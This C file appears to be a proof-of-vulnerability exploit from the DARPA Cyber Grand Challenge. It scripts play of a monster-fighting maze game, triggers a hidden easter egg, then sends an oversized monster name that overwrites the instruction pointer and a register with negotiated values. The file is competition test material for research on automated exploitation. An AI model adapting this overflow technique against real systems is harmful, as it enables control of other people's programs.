/*

Author: John Berry <hj@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libcgc.h>
#include "malloc.h"

#define EAX (0)
#define ECX (1)
#define ESI (6)
#define EBP (5)

typedef struct monster {
	char *type;
	int health;
	size_t hitpoints;
	size_t power;
	size_t experience;
	size_t level;
} monster, *pmonster;

typedef struct queue {
	int x;
	int y;
	struct queue *next;
	size_t index;
	char directions[512];
} queue, *pqueue;

typedef struct map {
	int width;
	int height;
	int start_x;
	int start_y;
	int end_x;
	int end_y;

	int current_x;
	int current_y;

	/// Last x where a marker was placed. Used to reverse on failure
	int last_x;

	/// Last y where a marker was placed
	int last_y;

	/// Map data
	char *map_data;
	char *matrix;

	char directions[1024];

	pqueue root;
} map, *pmap;

typedef struct player {
	char name[16];
	size_t level;
	size_t mcnt;
	pmonster mons[5];
} player, *pplayer;

char *inout;
size_t monster_exp;

#define         DEL     0x7f
#define         SPC     0x20

#define         TAB     0x09
#define         LF      0x0a
#define         VT      0x0b
#define         FF      0x0c
#define         CR      0x0d

int isspace( int c )
{
        if ( c == SPC ||
             c == TAB ||
             c == LF ||
             c == VT ||
             c == FF ||
             c == CR )
                return 1;
        else
                return 0;
}

int isdigit( int c )
{
        if ( c >= '0' && c <= '9' )
                return 1;
        else
                return 0;
}

int atoi( const char *pStr )
{
        int value = 0;
        int negative = 0;

        while ( isspace( *pStr ) )
                pStr++;

        if ( *pStr == '\0' )
                return 0;

        if ( *pStr == '-' )
        {
                negative = 1;
                pStr++;
        }

        // Read in string
        while ( isdigit( *pStr ) )
                value = (value * 10) + (*pStr++ - '0');

        if ( negative )
                return (-value);
        else
                return value;
}

size_t itoa( int value, char *out )
{
	size_t index = 0;

	if ( value < 0 ) {
		out[index++] = '-';
		value *= -1;
	}

	if ( value >= 10 ) {
		out[index++] = ( value / 10 ) + 0x30;
	}
	out[index++] = ( value % 10) + 0x30;

	return index;
}

size_t strlen( const char *str )
{
        size_t len = 0;
        while ( *str++ != '\0' )
                len++;

        return len;
}

void bzero( char *buffer, size_t length)
{
	size_t index = 0;

	if ( buffer == NULL ) {
		return;
	}

	while ( index < length ) {
		buffer[index] = 0;
		index++;
	}
	return;
}

void memcpy( char *dst, char*src, size_t length)
{
	size_t index = 0;

	if ( dst == NULL || src == NULL ) {
		return;
	}

	while ( index < length ) {
		dst[index] = src[index];
		index++;
	}

	return;
}

char *strcat(char *restrict s1, const char *restrict s2) {
        unsigned int i,j;

        if (!s1 || !s2) {
                return(NULL);
        }

        for (i = strlen(s1), j = 0; j < strlen(s2); i++, j++) {
                s1[i] = s2[j];
        }
        s1[i] = '\0';

        return(s1);
}

unsigned int ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int SendBytes(int fd, char *buf, unsigned int len) {
	size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) {
	unsigned int PovType = 1;

	// Request Type 1 negotitation
	if (SendBytes(3, (char *)&PovType, 4) != 4) {
		_terminate(-1);
	}

	// Send the ipmask
	if (SendBytes(3, (char *)&ipmask, 4) != 4) {
		_terminate(-1);
	}

	// Send the regmask
	if (SendBytes(3, (char *)&regmask, 4) != 4) {
		_terminate(-1);
	}

	// Send the register number we'll be controlling
	if (SendBytes(3, (char *)&regnum, 4) != 4) {
		_terminate(-1);
	}

	// get the 4-byte value for eip
	if (ReadBytes(3, (char *)type1_ip, 4) != 4) {
		_terminate(-1);
	} 
	// get the 4-byte value for the register
	if (ReadBytes(3, (char *)type1_reg, 4) != 4) {
		_terminate(-1);
	}

	return;

}

int addqueue( int x, int y, pmap m, char *dirs )
{
	pqueue pq = NULL;
	size_t index = 0;
	pqueue walker = NULL;

	/// Check too far left
	if ( x < 0|| m->width <= x ) {
		return 0;
	}

	if ( y < 0 || m->height <= y ) {
		return 0;
	}

	/// Calculate the index
	index = (m->width * y) + x;

	/// If set already then no
	if ( m->matrix[index] == 1 ) {
		return 0;
	}

	m->matrix[index] = 1;

	pq = malloc( sizeof(queue));

	if ( pq == NULL ) {
		_terminate(-1);
	}

	bzero((char*)pq, sizeof(queue));

	pq->x = x;
	pq->y = y;
	pq->index = strlen(dirs);

	memcpy( pq->directions, dirs, pq->index);

	/// Base case
	if (m->root == NULL ) {
		m->root = pq;
	} else { 
		// All others
		walker = m->root;

		while ( walker->next ) {
			walker = walker->next;
		}

		walker->next = pq;
	}

	return 1;
}

pqueue dequeue( pmap m )
{
	pqueue pq = m->root;

	if ( m->root != NULL ) {
		m->root = m->root->next;
	}

	return pq;

}

int findpath( pmap m )
{
	pqueue pq = NULL;

	/// Initial queues
	addqueue( m->start_x, m->start_y-1, m, "u");
	addqueue( m->start_x+1, m->start_y, m, "r");
	addqueue( m->start_x, m->start_y+1, m, "d");
	addqueue( m->start_x-1, m->start_y, m, "l");

	pq = dequeue( m );

	while ( pq ) {
		if ( pq->x == m->end_x && pq->y == m->end_y) {
			memcpy( m->directions, pq->directions, strlen( pq->directions) );
			return 1;
		}

		/// Otherwise add queue
		pq->directions[pq->index] = 'u';
		addqueue( pq->x, pq->y-1, m, pq->directions);
		pq->directions[pq->index] = 'r';
		addqueue( pq->x+1, pq->y, m, pq->directions);
		pq->directions[pq->index] = 'd';
		addqueue( pq->x, pq->y+1, m, pq->directions);
		pq->directions[pq->index] = 'l';
		addqueue( pq->x-1, pq->y, m, pq->directions);

		free(pq);

		pq = dequeue( m );

	}


	return 0;
}

int fight_monster( )
{
	int success = 0;
	char buffer[1024];
	int index;
	int yodog = 0;

	/// read the 26 lines
	for ( index = 0; index < 26; index++) {
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}


	while ( success == 0 && yodog < 10) {
		yodog++;
		/// Read 'Selection: '
		ReadBytes( STDIN, (char*)buffer, 11 );

		/// Send Attack
		SendBytes( STDOUT, "1\n", 2 );

		/// Read hit amount
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		monster_exp += 1;

		if ( monster_exp == 15 ) {
			/// Read monster gains a level
			ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			monster_exp = 0;
		}

		/// Read next line
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		/// Determine if the monster is dead
		if ( buffer[0] == 'Y' && buffer[1] == 'o' && buffer[2] == 'u') {

			ReadBytes( STDIN, (char*)buffer, 24);


			/// Don't capture monster
			SendBytes( STDOUT, "n\n", 2 );

			/// Player gains a level.
			ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			return 0;
		} else {
			for ( index = 0; index < 19; index++) {
			ReadUntil( STDIN, '\n', (char*)buffer, 1024);
			}
		}
	}

	return 0;
}

void fight_boss( unsigned int type1_reg, unsigned int type1_ip )
{
	char buffer[1024];
	int index = 0;
	int success = 0;
	unsigned int addr = 0;

	for ( index = 0; index < 28; index++ ) {
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}

	
	while ( success == 0 ) {
		/// Read "Selection: "
		ReadBytes( STDIN, (char*)buffer, 11);

		SendBytes( STDOUT, "1\n", 2);

		/// Hit for
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		monster_exp += 1;

		if ( monster_exp == 15 ) {
			ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			monster_exp = 0;
		}

		// hit back or destroyed
		ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		if ( buffer[0] == 'Y' && buffer[1] == 'o' && buffer[2] == 'u') {
			// Read capture
			ReadBytes( STDIN, (char*)buffer, 24);

			SendBytes(STDOUT, "y\n", 2);
			ReadBytes( STDIN, (char*)buffer, 25);

			/// Yes rename
			SendBytes(STDOUT, "y\n", 2);
			ReadBytes( STDIN, (char*)buffer, 10);

			memcpy( buffer, "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr\n", 73);

			addr = 0xbaaa0000;
			memcpy( buffer+32, (char*)&addr, 4 );
			memcpy( buffer+36, (char*)&type1_reg, 4);
			memcpy( buffer+44, (char*)&type1_ip, 4);

			/// Send bug
			SendBytes(STDOUT, buffer, 73);

			_terminate(0);
		} else {
			for ( index = 0; index < 19; index++ ) {
				ReadUntil( STDIN, '\n', (char*)buffer, 1024);
			}
		}

	}

	return;
}

void getvalues( pmap pm )
{
	char buffer[1024];
	size_t length = 0;

	bzero((char*)buffer, 1024);

	/// Read width and height
	ReadBytes(STDIN, (char*)buffer, 7);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->width = atoi( (const char *)buffer );

	ReadBytes(STDIN, (char*)buffer, 8);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->height = atoi( (const char *)buffer );

	/// Read startx
	ReadBytes(STDIN, (char*)buffer, 8);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->start_x = atoi( (const char *)buffer );

	/// Read starty
	ReadBytes(STDIN, (char*)buffer, 8);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->start_y = atoi( (const char *)buffer );

	/// Read endx
	ReadBytes(STDIN, (char*)buffer, 6);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->end_x = atoi( (const char *)buffer );

	/// Read endy
	ReadBytes(STDIN, (char*)buffer, 6);

	bzero( (char*)buffer, 1024);
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->end_y = atoi( (const char *)buffer );

	/// Read blank line
	ReadBytes( STDIN, (char*)buffer, 1);


	length = pm->width * pm->height;

	pm->map_data = malloc( length );
	pm->matrix = malloc( length );

	bzero( (char*)pm->map_data, length );
	bzero( (char*)pm->matrix, length);

	return;
}

void setname( void )
{
	char buffer[1024];
	size_t index = 0;

	bzero( (char*)buffer, 1024);

	while ( buffer[0] != '|' ) {
		ReadBytes(STDIN, (char*)buffer, 1);
	}

	ReadBytes( STDIN, (char*)buffer + strlen((char*)buffer), 2 );

	bzero( (char*)buffer, 1024);
	buffer[0] = '\n', 
	SendBytes(STDOUT, (char*)buffer, 1);

	//player Data
	for ( index = 0; index < 15; index++) {
		bzero( (char*)buffer, 1024);

		ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}

	return;
}

void sendegg( void )
{
	char buffer[1024];

	bzero( (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 3);

	bzero( (char*)buffer, 1024);
	buffer[0] = 'e';
	buffer[1] = '\n';

	SendBytes( STDOUT, (char*)buffer, 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "a\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "s\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "t\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "a\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, " \n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "e\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);


	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "g\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadBytes(STDIN, (char*)buffer, 2);
	SendBytes( STDOUT, "g\n", 2 );
	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	return;
}

void readmap( pmap pm )
{
	char buffer[1024];
	int index = 0;
	int length = 0;

	while ( index < (pm->width * pm->height) ) {

		/// Read a single byte
		length = ReadBytes( STDIN, (char*)buffer, 1);

		/// Exit on failure
		if ( length == 0 ) {
			_terminate(0);
		}

		/// Skip newlines
		if (buffer[0] == '\n') {
			continue;
		}

		pm->map_data[ index ] = buffer[0];

		if ( buffer[0] == '.' || buffer[0] == 'X') {
			pm->matrix[index] = 0;
		} else {
			pm->matrix[index] = 1;
		}
		
		index += 1;
	}

	return;
}

int main(void) {
	unsigned int type1_ip = 0;
	unsigned int type1_reg = 0;
	player new_player;
	size_t index = 0;
	size_t height =0 ;
	size_t map_index = 0;
	size_t success = 0;

	map m;
	monster_exp = 0;

	bzero( (char*)&m, sizeof(map));

	// negotiate a Type1 POV with the Competition Framework
	// we will control eip and ebp
	NegotiateType1Pov(0xfefefefe, 0xfefefefe, ESI, &type1_ip, &type1_reg);

	type1_ip |= 0x01010101;
	type1_reg |= 0x01010101;
	
	inout = malloc( 1024);

	bzero(inout, 1024);

	setname();

	getvalues( &m );

	readmap( &m );

	sendegg();

	findpath( &m );

	/// Loop through all the directions
	index = 0;

	while ( index < strlen(m.directions) ) {
		bzero((char*)inout, 1024);
		ReadBytes( STDIN, (char*)inout, 2);

		switch (inout[0]) {
			case ':':

				inout[0] = m.directions[index];
				inout[1] = '\n';

				SendBytes( STDOUT, (char*)inout, 2 );
				index++;

				break;
			case '#':
			case '.':
			case 'X':
			case '@':
				/// Read map
				for ( map_index = 0; map_index < m.height; map_index++) {
					ReadUntil( STDIN, '\n', (char*)inout, 1024);
				}
				break;
			case 'Y':
				/// You are being attacked by a monster
				fight_monster();
				break;
			case 'r':
				fight_boss(type1_reg, type1_ip);
				break;
			default:
				_terminate(-10);
				break;
		};
	}

	/// Read the map
	for ( map_index = 0; map_index < m.height; map_index++) {
		ReadUntil( STDIN, '\n', (char*)inout, 1024);
	}
	

	/// This should be the boss
	bzero((char*)inout, 1024);
	ReadUntil( STDIN, '\n', (char*)inout, 1024);
	
	if ( inout[0] != 'r' && inout[1] != 'e') {
		_terminate(-14);
	}

	ReadUntil( STDIN, '\n', (char*)inout, 1024);

	fight_boss(type1_reg, type1_ip);


	return 0;
}
